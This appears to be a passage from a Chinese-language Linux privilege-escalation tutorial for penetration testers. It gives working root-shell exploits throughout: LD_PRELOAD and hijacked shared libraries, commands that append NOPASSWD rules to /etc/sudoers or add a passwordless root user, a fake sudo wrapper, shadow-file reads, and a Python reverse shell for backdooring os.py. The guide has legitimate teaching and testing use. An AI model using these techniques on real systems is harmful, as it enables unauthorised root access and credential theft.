find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一些 **意想不到的命令允许你读取和/或写入文件，甚至执行命令。** 例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下，以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个示例中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在可以通过将 ssh key 添加到 root directory 或调用 `sh` 来轻松获取 shell。
```
sudo vim -c '!sh'
```
### SETENV

该指令允许用户在执行某些操作时 **set an environment variable**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
该示例（**based on HTB machine Admirer**）存在**漏洞**：可以通过**PYTHONPATH hijacking**在以 root 身份执行脚本时加载任意 python 库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

如果 sudoers 保留了 `BASH_ENV`（例如，`Defaults env_keep+="ENV BASH_ENV"`），你可以利用 Bash 的非交互启动行为，在调用被允许的命令时以 root 身份运行任意代码。

- Why it works: 对于非交互 shell，Bash 会求值 `$BASH_ENV` 并在运行目标脚本之前 source 该文件。许多 sudo 规则允许运行脚本或 shell 包装器。如果 `BASH_ENV` 被 sudo 保留，你的文件会以 root 权限被 source。

- Requirements:
- 你可以执行的 sudo 规则（任何以非交互方式调用 `/bin/bash` 的目标，或任何 bash 脚本）。
- `BASH_ENV` 出现在 `env_keep` 中（可用 `sudo -l` 检查）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 加固:
- 将 `BASH_ENV`（和 `ENV`）从 `env_keep` 中移除，优先使用 `env_reset`。
- 避免为 sudo-allowed 命令使用 shell 包装器；尽量使用最小化的二进制文件。
- 考虑在使用被保留的环境变量时启用 sudo 的 I/O 日志记录和告警。

### Sudo 执行绕过路径

**Jump** 以读取其他文件或使用 **symlinks**。例如在 sudoers 文件中： _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用了 **wildcard** (\*)，就更简单了：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**缓解措施**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary 未指定命令路径

如果将 **sudo 权限** 授予单个命令 **但未指定路径**： _hacker10 ALL= (root) less_，可以通过更改 PATH 变量来利用它。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
该技术也适用于当一个 **suid** 二进制文件 **执行另一个命令但未指定其路径时（务必使用** _**strings**_ **检查可疑 SUID 二进制文件的内容**）。**

[Payload examples to execute.](payloads-to-execute.md)

### 带命令路径的 SUID 二进制

如果这个 **suid** 二进制 **执行另一个命令并指定了路径**，那么你可以尝试 **export a function**，其名称与 suid 文件所调用的命令相同。

例如，如果一个 suid 二进制调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并将其 **export**：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用 suid 可执行文件时，这个函数会被执行

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

然而，为了维护系统安全并防止该特性被滥用，尤其是针对 **suid/sgid** 可执行文件，系统强制执行以下条件：

- 当真实用户 ID (_ruid_) 与有效用户 ID (_euid_) 不匹配的可执行文件时，加载器会忽略 **LD_PRELOAD**。
- 对于带有 suid/sgid 的可执行文件，只有位于标准路径且同样具有 suid/sgid 属性的库会被预加载。

Privilege escalation 可能发生在你可以使用 `sudo` 执行命令，且 `sudo -l` 的输出包含语句 **env_keep+=LD_PRELOAD** 的情况下。该配置允许 **LD_PRELOAD** 环境变量在使用 `sudo` 运行命令时仍然保留并被识别，可能导致以提升的权限执行任意 code。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令 **编译它**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，运行 **escalate privileges**
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制了 **LD_LIBRARY_PATH** env variable，就可以滥用类似的 privesc，因为他控制了库将被搜索的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

当遇到具有 **SUID** 权限且看起来异常的二进制程序时，最好确认它是否正确加载 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到像 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 这样的错误，表明可能存在可利用的漏洞。

要利用此漏洞，可以通过创建一个 C 文件，比如 _"/path/to/.config/libcalc.c"_，其内容如下：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
这段代码在编译并执行后，旨在通过修改文件权限并以提升的权限执行一个 shell 来提升权限。

使用以下命令将上述 C 文件编译为共享对象 (.so) 文件：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID binary 应该会触发 exploit，从而可能导致系统妥协。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
既然我们已经找到一个 SUID binary 会从我们有写权限的 folder 加载 library，接下来就在该 folder 中以必要的名称创建该 library：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到如下错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
那意味着你生成的库需要有一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个精心整理的 Unix 二进制文件列表，攻击者可以利用这些二进制文件来绕过本地安全限制。 [**GTFOArgs**](https://gtfoargs.github.io/) 则用于只能够在命令中**注入参数**的情形。

该项目收集了 Unix 二进制文件的合法功能，这些功能可能被滥用来突破受限 shell、提升或维持特权、传输文件、生成 bind 和 reverse shells，并辅助其他 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你能运行 `sudo -l`，可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 来检查它是否能发现可利用的 sudo 规则。

### 重用 sudo 令牌

在你拥有 **sudo access** 但不知道密码的情况下，你可以通过**等待 sudo 命令被执行然后劫持会话令牌**来提升权限。

提升权限的前提条件：

- 你已经以用户 _sampleuser_ 拥有一个 shell
- _sampleuser_ 已经在**最近 15 分钟**内**使用过 `sudo`** 来执行某些命令（默认 sudo 令牌在此期间允许我们使用 `sudo` 而无需输入密码）
- `cat /proc/sys/kernel/yama/ptrace_scope` 的结果为 0
- `gdb` 可用（你需要能够上传它）

（你可以通过 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 临时启用 ptrace_scope，或通过修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0` 来永久启用）

如果满足所有这些前提条件，**你可以使用以下工具提升权限：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 第一个 **exploit** (`exploit.sh`) 会在 _/tmp_ 创建二进制文件 `activate_sudo_token`。你可以用它来**在你的会话中激活 sudo token**（你不会自动获得 root shell，运行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- 该 **第二个 exploit** (`exploit_v2.sh`) 将在 _/tmp_ 创建一个 sh shell，**归 root 所有并具有 setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- 该 **第三个 exploit** (`exploit_v3.sh`) 将 **创建一个 sudoers file**，使 **sudo tokens 永久有效并允许所有用户使用 sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你在该文件夹或其内任意已创建文件上具有 **写权限**，你可以使用二进制 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来 **为用户和 PID 创建 sudo token**。\
例如，如果你可以覆盖文件 _/var/run/sudo/ts/sampleuser_，并且你以该用户身份拥有 PID 1234 的 shell，你可以在不需要知道密码的情况下通过以下方式 **获得 sudo 权限**：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 和 `/etc/sudoers.d` 中的文件配置了谁可以使用 `sudo` 以及如何使用。\
这些文件**默认情况下只能由用户 root 和组 root 读取**.\
**如果**你可以**读取**这个文件，你可能能够**获取一些有趣的信息**，而如果你可以**写入**任何文件，你将能够**escalate privileges**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你有写权限，你就可以滥用该权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
另一种滥用这些权限的方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些可以替代 `sudo` 二进制的工具，例如 OpenBSD 的 `doas`，记得检查其配置文件 `/etc/doas.conf`。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道一个**用户通常连接到一台机器并使用 `sudo`** 提权，并且你已经在该用户上下文获得了一个 shell，你可以**创建一个新的 sudo 可执行文件**，它会先以 root 身份执行你的代码，然后再执行用户的命令。接着，**修改该用户上下文的 $PATH**（例如在 .bash_profile 中添加新的路径），这样当用户执行 sudo 时，就会执行你创建的 sudo 可执行文件。

请注意，如果用户使用不同的 shell（非 bash），你需要修改其他文件以添加新的路径。例如[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 修改 `~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 找到另一个示例。

或者运行类似于：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将 lib 复制到 `/var/tmp/flag15/`，它将按 `RPATH` 变量指定的位置被程序使用。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 中创建一个恶意库，使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 能力

Linux capabilities 为进程提供可用 root 特权的**子集**。这实际上将 root **特权分解为更小且独立的单元**。这些单元中的每一个都可以独立授予给进程。这样可以减少完整特权集，从而降低被利用的风险。\
阅读以下页面以**了解有关 capabilities 及如何滥用它们的更多信息**：


{{#ref}}
linux-capabilities.md
{{#endref}}

## 目录权限

在目录中，**"execute" 位**表示受影响的用户可以**"cd"**进入该文件夹。\
**"read"** 位表示用户可以**列出**该目录中的**文件**，而 **"write"** 位表示用户可以**删除**和**创建**新的**文件**。

## ACLs

Access Control Lists (ACLs) 表示可自由支配权限的二级层次，能够**覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝特定非所有者或非组成员用户的权限，提高了对文件或目录访问的控制。这种**细粒度**确保了更精确的访问管理。更多细节可在 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) 找到。

**给** 用户 "kali" 对一个文件授予读写权限：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取** 系统中具有特定 ACLs 的文件：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开 shell 会话

在 **旧版本** 中，你可能会 **hijack** 不同用户（**root**）的某些 **shell** 会话。\
在 **最新版本** 中，你只能 **connect** 到属于 **your own user** 的 **screen sessions**。不过，你可能会在会话内发现 **有趣的信息**。

### screen sessions hijacking

**列出 screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

这是 **old tmux versions** 的问题。我作为非特权用户无法劫持由 root 创建的 tmux (v2.1) session。

**列出 tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月到2008年5月13日之间，在基于 Debian 的系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥可能受到此漏洞影响。\
该漏洞在这些操作系统上创建新的 ssh 密钥时发生，原因是 **只有 32,768 种可能性**。这意味着可以穷举所有可能性，**有了 ssh 公钥就可以搜索对应的私钥**。你可以在这里找到已计算出的可能性： [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH 有用的配置项

- **PasswordAuthentication:** 指定是否允许密码认证。默认是 `no`。
- **PubkeyAuthentication:** 指定是否允许公钥认证。默认是 `yes`。
- **PermitEmptyPasswords**: 当允许密码认证时，指定服务器是否允许使用空密码字符串的账户登录。默认是 `no`。

### PermitRootLogin

指定 root 是否可以通过 ssh 登录，默认是 `no`。可能的值：

- `yes`: root 可以使用密码和私钥登录
- `without-password` or `prohibit-password`: root 只能使用私钥登录
- `forced-commands-only`: root 只能使用私钥登录，且需指定 commands 选项
- `no` : 不允许

### AuthorizedKeysFile

指定包含可用于用户认证的公钥的文件。它可以包含像 `%h` 这样的标记，%h 将被替换为用户主目录。**可以指定绝对路径**（以 `/` 开头）或**相对于用户主目录的相对路径**。例如：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置表示，如果你尝试使用用户 "**testusername**" 的 **private** key 登录，ssh 会将你密钥的 public key 与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 的条目进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **use your local SSH keys instead of leaving keys**（不要把没有 passphrases 的 keys 留在服务器上！）。因此，你可以 **jump** via ssh **to a host**，然后从那里 **jump to another** host，**using** 存放在你 **initial host** 的 **key**。

你需要在 `$HOME/.ssh.config` 中设置这个选项，如下：
```
Host example.com
ForwardAgent yes
```
注意，如果 `Host` 是 `*`，每次用户跳转到不同的机器时，该主机将能够访问这些密钥（这是一个安全问题）。

文件 `/etc/ssh_config` 可以**覆盖**这些**选项**并允许或拒绝此配置。\
文件 `/etc/sshd_config` 可以通过关键字 `AllowAgentForwarding` **允许**或**拒绝** ssh-agent 转发（默认为 allow）。

如果你发现环境中配置了 Forward Agent，请阅读以下页面，因为**你可能能够滥用它以提升权限**：


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### Profiles files

文件 `/etc/profile` 和 `/etc/profile.d/` 下的文件是**当用户运行一个新的 shell 时会执行的脚本**。因此，如果你可以**写入或修改其中的任何一个，你就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何可疑的 profile 脚本，你应该检查它是否包含 **敏感信息**。

### Passwd/Shadow 文件

根据操作系统，`/etc/passwd` 和 `/etc/shadow` 可能使用不同的名称或存在备份。因此建议 **查找所有这些文件** 并 **检查是否能读取它们**，以查看文件中 **是否包含哈希**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd`（或等效）文件中找到 **password hashes**。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用下列命令之一生成一个密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
然后添加用户 `hacker` 并添加生成的密码。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在你可以使用 `su` 命令并使用 `hacker:hacker`

或者，你可以使用以下行来添加一个无密码的伪用户。\
警告：这可能会降低当前机器的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台上 `/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，另外 `/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以**写入某些敏感文件**。例如，你能否写入某些**服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行一个 **tomcat** 服务器并且你可以 **modify the Tomcat service configuration file inside /etc/systemd/,** 那么你可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的 backdoor 将在下次启动 tomcat 时被执行。

### Check Folders

以下文件夹可能包含备份或有趣的信息： **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (最后一个你可能无法读取，但可以尝试)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 异常位置/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的 Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知包含密码的文件

查看 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索 **多个可能包含密码的文件**。\
**另一个有趣的工具** 可以用来做这件事的是: [**LaZagne**](https://github.com/AlessandroZ/LaZagne)，它是一个开源应用程序，用于检索存储在本地计算机上的大量密码，支持 Windows、Linux & Mac。

### 日志

如果你能读取日志，你可能能够在其中找到 **有趣/机密的信息**。日志越奇怪，可能越有价值（可能）。\
另外，一些“**错误配置的**”（或被植入后门？）**审计日志** 可能允许你在审计日志中**记录密码**，正如这篇文章所解释的: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了 **读取日志，该组** [**adm**](interesting-groups-linux-pe/index.html#adm-group) 会非常有用。

### Shell 文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

你还应该检查文件名或内容中包含 "**password**" 这个词的文件，并且检查日志中是否包含 IP 和 邮件地址，或哈希的正则表达式。\
我不会在这里列出如何完成所有这些检查，但如果你感兴趣，可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## 可写文件

### Python library hijacking

如果你知道 python 脚本将从 **在哪里** 被执行，并且你 **可以在该文件夹写入** 或者 **修改 python libraries**，你就可以修改 OS 库 并对其进行 backdoor（如果你能在 python 脚本将被执行的位置写入，复制并粘贴 os.py library）。

要 **backdoor the library**，只需在 os.py library 的末尾添加以下行（更改 IP 和 PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 利用

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> 此漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**漏洞参考：** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果出于任何原因，用户能够在 _/etc/sysconfig/network-scripts_ **写入** 一个 `ifcf-<whatever>` 脚本，或者能够 **调整** 一个已有脚本，那么你的 **system is pwned**。

Network scripts，例如 _ifcg-eth0_，用于网络连接。它们看起来就像 .INI 文件。然而，它们在 Linux 上被 \~sourced\~，由 Network Manager (dispatcher.d) 执行。

在我的案例中，这些 network 脚本中的 `NAME=` 属性没有被正确处理。如果名称中有 **空白/空格，系统会尝试执行空白/空格之后的部分**。这意味着 **第一个空格之后的所有内容都会以 root 身份执行**。

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注意 Network 和 /bin/id_ 之间的空格_)

### **init, init.d, systemd, and rc.d**

目录 `/etc/init.d` 存放用于 System V init (SysVinit) 的 **scripts**，这是 **经典的 Linux 服务管理系统**。该目录包含用于 `start`、`stop`、`restart`，有时还有 `reload` 服务的脚本。这些脚本可以直接执行，或者通过位于 `/etc/rc?.d/` 的符号链接来调用。Redhat 系统中的替代路径为 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关联，Upstart 是 Ubuntu 引入的较新 **service management**，使用配置文件来管理服务。尽管已向 Upstart 迁移，但由于 Upstart 中的兼容层，SysVinit 脚本仍与 Upstart 配置一起被使用。

